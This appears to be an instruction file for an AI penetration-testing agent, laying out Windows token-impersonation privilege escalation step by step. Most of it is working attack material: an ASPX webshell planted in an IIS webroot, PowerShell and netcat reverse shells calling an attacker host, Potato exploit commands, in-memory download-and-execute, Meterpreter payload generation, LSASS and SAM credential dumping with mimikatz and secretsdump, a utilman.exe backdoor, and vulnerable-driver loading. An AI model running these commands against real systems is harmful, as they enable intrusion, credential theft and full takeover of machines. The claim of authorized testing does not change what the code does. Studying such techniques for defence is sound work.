---
name: windows-token-impersonation
description: >
  Exploit Windows token privileges for local privilege escalation to SYSTEM.
keywords:
  - potato exploit
  - juicypotato
  - printspoofer
  - godpotato
  - token impersonation
  - SeImpersonate
  - SeDebug
  - dangerous privileges
  - service account to system
tools:
  - JuicyPotato
  - PrintSpoofer
  - GodPotato
  - RoguePotato
  - EfsPotato
  - SigmaPotato
  - FullPowers
  - mimikatz
  - incognito
opsec: medium
---

# Windows Token Impersonation & Dangerous Privileges

You are helping a penetration tester escalate privileges on a Windows system by
exploiting token privileges. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[windows-token-impersonation] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on a Windows system
- At least one exploitable token privilege (check with `whoami /priv`)
- OR: known credentials for a user who can write to a service webroot (see Step 0)
- Ability to transfer tools to target (or use tools already present)
- Potato binaries pre-staged at `/usr/share/windows-binaries/potatoes/` on the
  attackbox (GodPotato-NET4.exe, PrintSpoofer64.exe, JuicyPotatoNG.exe,
  SigmaPotato.exe). If missing, fall back to Metasploit `getsystem` (Step 3b).

## Step 0: Obtain SeImpersonate Shell

**When to use:** You have a low-privilege shell and known credentials for another
user, and discovery identified that a service account (IIS AppPool, MSSQL) or a
writable webroot can give you SeImpersonate. The goal is to execute commands as
that user — typically to deploy a webshell in a service webroot, then catch the
service account's reverse shell.

**Skip this step** if you already have SeImpersonate or another exploitable
privilege (proceed to Step 1).

### Method 1: PowerShell Remoting to localhost (most common)

WinRM must be enabled (default on Server editions, common in HTB/OSCP labs).
This runs commands as the target user on the same host.

```powershell
$secpasswd = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $secpasswd)

# Test connectivity first
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }

# Write a webshell to the service webroot
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    Set-Content -Path 'C:\inetpub\wwwroot\shell.aspx' -Value '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>'
}

# Or execute arbitrary commands directly
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    cmd /c "whoami /priv"
}
```

**Troubleshooting:**
- "Access denied" → user may not be in Remote Management Users group; try Method 2
- "WinRM cannot process the request" → WinRM not enabled; try Method 2 or 3

### Method 2: WMI process creation

Works when WinRM is disabled. Creates a process as the target user via WMI.
Output is blind — use file writes to confirm execution.

```powershell
$secpasswd = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $secpasswd)

# Write webshell via WMI (blind — no output returned)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /c echo ^<%@ Page Language="C#" %^>^<%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%^> > C:\inetpub\wwwroot\shell.aspx' -Credential $cred
```

**Note:** WMI process creation is blind — `ReturnValue = 0` means the process
was created, not that the command succeeded. Verify by checking if the file
exists afterward.

### Method 3: Scheduled task (if user has batch logon rights)

Works without WinRM or WMI remote access. Uses Task Scheduler to run a command
as the target user.

```cmd
schtasks /create /tn "deploy" /tr "cmd /c echo PAYLOAD > C:\inetpub\wwwroot\shell.aspx" /sc once /st 00:00 /ru DOMAIN\user /rp PASSWORD
schtasks /run /tn "deploy"
timeout /t 3
schtasks /delete /tn "deploy" /f
```

**Troubleshooting:**
- "ERROR: The user name or password is incorrect" → verify creds with `net use`
- "Access denied" → current user lacks schtasks permission; try from attackbox

### Method 4: From attackbox (when in-shell methods fail)

If all in-shell methods fail, return to the orchestrator requesting lateral
movement routing (pass-the-hash, evil-winrm, wmiexec, atexec). Those tools
authenticate over the network and are covered by their own skills with proper
methodology. Note what in-shell methods were tried and why they failed.

### ASPX webshell payloads

Minimal one-liner for IIS deployment — takes commands via `?c=` parameter:

```aspx
<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>
```

Reverse shell trigger after deploying the webshell:

```bash
# On attackbox — start listener via shell-server
# start_listener(port=4444, label="iis-apppool")

# Trigger reverse shell via the webshell
curl -s "http://TARGET/shell.aspx?c=powershell+-nop+-c+\"$client=New-Object+System.Net.Sockets.TCPClient('ATTACKER',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne+0){$data=(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex+$data+2>&1|Out-String);$sendback2=$sendback+'PS+'+$(pwd).Path+'>';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
```

### Catch the service account shell

After deploying the webshell:

1. Call `start_listener(port=4444, label="iis-apppool")` on the attackbox
2. Trigger the reverse shell via HTTP request to the webshell
3. Call `stabilize_shell(session_id=...)` to upgrade the connection
4. Verify SeImpersonate: `send_command(session_id=..., command="whoami /priv")`
5. Confirm `SeImpersonatePrivilege` is present → proceed to Step 1

### Step 0 decision tree

```
Have known creds + writable webroot identified?
│
├─ PowerShell Remoting (Invoke-Command -ComputerName localhost)
│  └─ Failed? (WinRM disabled, not in Remote Management Users)
│
├─ WMI process creation (Invoke-WmiMethod Win32_Process)
│  └─ Failed? (WMI access denied, DCOM disabled)
│
├─ Scheduled task (schtasks /create /ru user /rp pass)
│  └─ Failed? (no batch logon rights, schtasks blocked)
│
└─ ALL IN-SHELL METHODS FAILED → STOP
   Return to orchestrator for lateral movement routing (attackbox tools).
   Include: creds, what was tried, why each method failed.
```

## Step 1: Check Privileges

```cmd
whoami /priv
whoami /groups
```

**Look for these privileges (Enabled or Disabled — Disabled can be enabled programmatically):**

| Privilege | Impact | Exploitation |
|-----------|--------|-------------|
| SeImpersonatePrivilege | Impersonate any token with a handle | Potato family |
| SeAssignPrimaryTokenPrivilege | Assign token to new process | Potato family |
| SeDebugPrivilege | Read/write any process memory | Token theft from SYSTEM process |
| SeBackupPrivilege | Read any file bypassing DACL | SAM/SYSTEM hive extraction |
| SeRestorePrivilege | Write any file bypassing DACL | DLL hijack / binary replace |
| SeTakeOwnershipPrivilege | Take ownership of any object | Ownership → DACL → full access |
| SeLoadDriverPrivilege | Load kernel drivers | Load vulnerable driver → SYSTEM |
| SeManageVolumePrivilege | Raw disk access | Read SAM/secrets bypassing NTFS |
| SeCreateTokenPrivilege | Create arbitrary tokens | Forge admin token |

**If running as LOCAL SERVICE / NETWORK SERVICE with stripped privileges:**

Use FullPowers to restore default service account privileges first:

```cmd
FullPowers.exe -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd" -z
```

FullPowers creates a scheduled task to spawn a process with the full privilege set,
then restores SeImpersonatePrivilege to the current token.

## Step 2: Determine OS Version

The OS version determines which Potato variant works:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ver
```

```powershell
[System.Environment]::OSVersion.Version
(Get-CimInstance Win32_OperatingSystem).BuildNumber
```

**Also check if Print Spooler is running (needed for PrintSpoofer):**

```cmd
sc query Spooler
```

## Step 2b: Check Architecture

**Critical:** Potato binaries are architecture-specific. Verify before downloading:

```cmd
wmic os get osarchitecture
systeminfo | findstr /C:"System Type"
```

| Output | Architecture | Binary needed |
|--------|-------------|---------------|
| `X86-based PC` / `32-bit` | x86 | 32-bit binaries |
| `x64-based PC` / `64-bit` | x64 | 64-bit binaries |

**Architecture impacts variant availability:**
- **JuicyPotato**: Official GitHub release is **x64-only**. For x86 targets,
  use GodPotato, SigmaPotato (in-memory via PowerShell), or compile from source
  with 32-bit MinGW. If no x86 Potato variant is available, route to kernel
  exploits (see fallback below).
- **GodPotato**: Available as both x86 and x64 (.NET 3.5 and .NET 4 variants).
  Preferred for x86 targets.
- **PrintSpoofer**: Available as both x86 and x64.
- **SigmaPotato**: In-memory via PowerShell — architecture-independent if
  PowerShell is available (loads correct .NET assembly at runtime).
- **EfsPotato**: Compile from source — choose target architecture.

## Step 3: Potato Variant Selection

Use SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to get SYSTEM via DCOM
token impersonation. Select variant by Windows version **and architecture** (see
Step 2b):

### JuicyPotato — Windows 7/8/10 (pre-1809), Server 2008-2016

Abuses DCOM/COM activation with chosen CLSID. Requires a valid CLSID for the target
OS version.

**Architecture warning:** The official GitHub release (`ohpe/juicy-potato`) is
**x64-only**. On x86 targets, use GodPotato-NET35/NET4 (has x86 builds),
SigmaPotato via PowerShell (architecture-independent), or compile JuicyPotato
from source with `i686-w64-mingw32-gcc`. Do not download the official release
for x86 targets — it will not execute.

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
```

**Parameters:**
- `-l` — COM server listen port
- `-p` — program to launch
- `-a` — arguments to program
- `-t` — `*` (try both), `t` (CreateProcessWithTokenW), `u` (CreateProcessAsUser)
- `-c` — target CLSID (OS-specific, see below)

**Common CLSIDs:**
```
{4991d34b-80a1-4291-83b6-3328366b9097}
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{B91D5831-B1BD-4608-8198-D72E155020F7}
```

CLSID lists per OS: https://ohpe.it/juicy-potato/CLSID/

**Testing CLSIDs (if default fails):**
1. Download `GetCLSID.ps1` + `test_clsid.bat`
2. Run `test_clsid.bat` — when port number changes, CLSID worked
3. Use working CLSID with `-c`

### PrintSpoofer — Windows 10/11, Server 2016-2019

Simplest variant. Abuses Print Spooler named pipe to capture SYSTEM token.

```cmd
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
```

**Parameters:**
- `-i` — interactive console
- `-c` — command to execute
- `-d` — desktop session ID (for RDP contexts)

**Requires:** Print Spooler service running. If disabled (post-PrintNightmare
hardening), use GodPotato, RoguePotato, or EfsPotato instead.

### GodPotato — Windows 8-11, Server 2012-2022

DCOM-based impersonation. Broad version support, no external dependencies.

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
GodPotato-NET35.exe -cmd "cmd /c whoami"
```

Choose `.NET4` or `.NET35` binary matching the installed runtime.

**GodPotato SYSTEM networking limitation:** SYSTEM processes spawned by
GodPotato often have restricted outbound networking (no reverse shell callback).
If your SYSTEM reverse shell fails to connect back, use file-based commands
instead: `GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\flag.txt"`
then read the output file from your existing shell. This also applies to
credential harvesting — run `reg save` or `secretsdump` commands via GodPotato
and retrieve output files through the pre-SYSTEM shell.

**Staging pattern (for webshells with short timeouts):**
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile C:\temp\gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile C:\temp\shell.ps1
C:\temp\gp.exe -cmd "powershell -ep bypass C:\temp\shell.ps1"
```

### RoguePotato — Windows 10 1809+, Server 2019+

Fake OXID resolver for SYSTEM authentication. Requires a controlled machine for
OXID resolution (or local port forwarding).

```cmd
RoguePotato.exe -r ATTACKER_IP -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -l 9999
```

**Attacker-side redirector (forward port 135 to victim):**
```bash
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```

**Parameters:**
- `-r` — OXID resolver IP (attacker machine)
- `-c` — command to execute
- `-l` — local listener port (9999 typical)

### EfsPotato / SharpEfsPotato — Windows 8-11, Server 2012-2022

Abuses MS-EFSR (Encrypting File System Remote) protocol. Multiple pipe fallbacks.

```cmd
EfsPotato.exe "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
EfsPotato.exe "whoami" efsrpc
SharpEfsPotato.exe -p cmd.exe -a "/c whoami"
```

**Pipe fallback order (if default fails):** lsarpc → efsrpc → samr → lsass → netlogon

### SigmaPotato — Windows 8-11, Server 2012-2022

GodPotato fork with in-memory execution and built-in reverse shell.

```powershell
# In-memory execution (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Built-in reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

### JuicyPotatoNG — Windows 10 1809+, Server 2019-2022

Modern JuicyPotato with DCOM/OXID improvements.

```cmd
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
```

For Windows 11 / Server 2022 after January 2023 patches:
```cmd
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami" -c {A9819296-E5B3-4E67-8226-5E72CE9E1FB7}
```

### PrintNotifyPotato — Windows 10/11, Server 2012-2022

Targets PrintNotify service instead of Spooler. Works even when Spooler is disabled.

```cmd
PrintNotifyPotato.exe cmd /c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Potato Variant Decision Tree

```
whoami /priv → SeImpersonate or SeAssignPrimaryToken?
│
├─ Check architecture (Step 2b)
│  ├─ x86 → avoid official JuicyPotato (x64-only)
│  │         prefer GodPotato-NET35/NET4 or SigmaPotato (PowerShell)
│  └─ x64 → all variants available
│
├─ Windows <= 10 1803 / Server 2016
│  ├─ x64? → JuicyPotato (needs CLSID)
│  └─ x86? → GodPotato > SigmaPotato (in-memory) > compile JuicyPotato from source
├─ Windows 10 1809+ / Server 2019
│  ├─ Print Spooler running? → PrintSpoofer (simplest, has x86+x64)
│  ├─ Egress available? → RoguePotato
│  └─ Neither? → GodPotato or EfsPotato
├─ Windows 10/11 / Server 2022
│  ├─ PrintSpoofer (if Spooler running)
│  ├─ GodPotato / SigmaPotato (most reliable)
│  ├─ EfsPotato (pipe fallback)
│  └─ JuicyPotatoNG (specific CLSID post-Jan 2023)
├─ Spooler disabled everywhere?
│  └─ GodPotato > EfsPotato > RoguePotato > PrintNotifyPotato
│
└─ No standalone Potato binaries available?
│  └─ Try Metasploit getsystem (Step 3b) if Meterpreter is viable
│
└─ ALL METHODS FAILED? (wrong arch, no binary, service disabled, blocked)
   └─ STOP. Do NOT attempt kernel exploits inline.
     Report in your return summary: what was tried, why it failed, OS version, arch.
     Return to orchestrator for re-routing to **windows-kernel-exploits**.
```

### Step 3b: Metasploit getsystem (Fallback)

When standalone Potato binaries are not pre-staged on the attackbox, use
Metasploit's built-in `getsystem` which implements multiple named pipe
impersonation techniques internally.

```bash
# 1. Generate Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=9001 -f exe -o /tmp/claude-1000/meterpreter.exe

# 2. Start handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 9001; run"

# 3. Transfer and execute payload on target (via existing shell)
# Serve: python3 -m http.server 8888 --directory /tmp/claude-1000
# Download on target: certutil -urlcache -f http://ATTACKER:8888/meterpreter.exe C:\Windows\Temp\svc.exe
# Execute: C:\Windows\Temp\svc.exe

# 4. In Meterpreter session:
getsystem
getuid        # Should show NT AUTHORITY\SYSTEM
```

**getsystem techniques (in order):**

| # | Technique | Pipe | Notes |
|---|-----------|------|-------|
| 1 | Named Pipe Impersonation (In-Memory) | `\\.\pipe\random` | Default, most common |
| 2 | Named Pipe Impersonation (Dropper) | `\\.\pipe\random` | Drops DLL |
| 3 | Token Duplication (In-Memory) | — | Duplicates from SYSTEM process |
| 4 | Named Pipe Impersonation (RPCSS) | RPCSS variant | — |
| 5 | Named Pipe Impersonation (PrintSpoofer) | `\\.\pipe\spoolss` | Needs Spooler |
| 6 | Named Pipe Impersonation (EfsPotato) | `\\.\pipe\efsrpc` | Most reliable fallback |

Technique 6 (EfsPotato/EFSRPC) is the most reliable when Print Spooler is
disabled. If `getsystem` fails with default technique, specify:
`getsystem -t 6`

## Step 4: Other Dangerous Privilege Exploitation

If Potato-applicable privileges aren't available, exploit other dangerous privileges:

### SeDebugPrivilege → SYSTEM via Token Theft

Duplicate token from a SYSTEM process (lsass.exe, winlogon.exe, services.exe).

**Via psgetsys.ps1:**
```powershell
import-module psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id, "C:\Windows\System32\cmd.exe")
```

**Via Metasploit incognito:**
```
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

**SeDebug also enables LSASS dump:**
```cmd
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```
Then offline: `mimikatz # sekurlsa::minidump lsass.dmp` → `sekurlsa::logonpasswords`

### SeBackupPrivilege → Read SAM/SYSTEM Hives

```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

Or use `robocopy /b` (requires SeRestorePrivilege too):
```cmd
robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM
```

Then extract hashes offline:
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### SeRestorePrivilege → Write Any File

Replace a service binary or DLL loaded by a SYSTEM process:

```powershell
# Enable privilege
Enable-SeRestorePrivilege
# Overwrite utilman.exe with cmd.exe for login-screen SYSTEM shell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Lock screen → Win+U → SYSTEM cmd
```

Or write a malicious DLL to a directory in the search path of a SYSTEM service.
Escalate for targets.

### SeTakeOwnershipPrivilege → Own Any Object

```cmd
takeown /f "C:\Windows\System32\config\SAM"
icacls "C:\Windows\System32\config\SAM" /grant %USERNAME%:F
```

Then read the file. Works on registry keys too:

```powershell
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\TargetService", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
```

### SeLoadDriverPrivilege → Load Vulnerable Kernel Driver

```cmd
# Write driver config to HKCU (writable without admin)
reg add "HKCU\System\CurrentControlSet\Services\VulnDriver" /v ImagePath /t REG_SZ /d "\??\C:\temp\vuln_driver.sys"
reg add "HKCU\System\CurrentControlSet\Services\VulnDriver" /v Type /t REG_DWORD /d 1
```

Load a driver with known vulnerabilities (e.g., Capcom.sys) to get kernel R/W,
then overwrite SYSTEM process token.

Cross-reference loaded drivers against https://loldrivers.io for known-vulnerable
drivers already on the system.

### SeManageVolumePrivilege → Raw Volume Read

Bypass NTFS ACLs by reading raw disk sectors:

```powershell
$fs = [System.IO.File]::Open("\\.\C:", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
$buf = New-Object byte[] (1MB)
$null = $fs.Read($buf, 0, $buf.Length)
$fs.Close()
[IO.File]::WriteAllBytes("C:\temp\first_mb.bin", $buf)
```

**High-value targets:**
- `C:\Windows\System32\config\SAM` / `SYSTEM` / `SECURITY`
- `C:\Windows\NTDS\ntds.dit` (Domain Controllers)
- Machine crypto keys in `%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\`

Use tools like RawCopy, FTK Imager, or The Sleuth Kit for structured extraction.

## Step 5: Escalate or Pivot

## Troubleshooting

### Potato says "authresult 0" but no shell spawns
The CLSID worked but process creation failed. Try `-t *` to test both
CreateProcessWithToken and CreateProcessAsUser. Also verify the command path
is correct (use full paths).

### JuicyPotato binary won't execute — "not a valid Win32 application"
Architecture mismatch. The official JuicyPotato release is x64-only. On x86
targets, use GodPotato (has x86 builds), SigmaPotato via PowerShell, or compile
from source. Always run `systeminfo | findstr "System Type"` (Step 2b) before
downloading binaries.

### JuicyPotato fails on Windows 10 1809+
Expected — Microsoft hardened DCOM activation. Use PrintSpoofer, GodPotato,
RoguePotato, or EfsPotato instead.

### PrintSpoofer fails — "Cannot find Spooler"
Print Spooler service is disabled (common post-PrintNightmare hardening).
Use GodPotato, EfsPotato, or PrintNotifyPotato (targets PrintNotify service
which is often still present).

### EfsPotato fails on default pipe
Try alternate pipes: `EfsPotato.exe "whoami" efsrpc` → `samr` → `lsass` → `netlogon`

### Token privilege shows "Disabled"
Disabled privileges can be enabled programmatically. Most Potato variants and
tools handle this automatically. If not, use `EnableAllTokenPrivs.ps1` or
adjust token in code.

### FullPowers fails — not a service account
FullPowers only works for LOCAL SERVICE and NETWORK SERVICE accounts. For other
accounts, the privileges shown by `whoami /priv` are the actual privileges available.

### All Potato variants failed — no working binary for this OS/arch
Do NOT fall back to kernel exploits inline. This skill's scope is token
privilege abuse, not kernel exploitation. Report in your return summary:
what was tried and why it failed, then return to the orchestrator. The
orchestrator will re-route to **windows-kernel-exploits** which has systematic
exploit suggestion (WES-NG/Watson), architecture-aware binary sourcing, and
crash-risk assessment.

### SeDebug but LSASS is PPL-protected
LSASS runs as Protected Process Light (RunAsPPL=1). Options:
1. Use vulnerable driver to disable PPL (SeLoadDriverPrivilege or BYOVD)
2. Target other SYSTEM processes (winlogon.exe, services.exe)
3. Use `mimikatz !processprotect /process:lsass.exe /remove` with mimidrv.sys
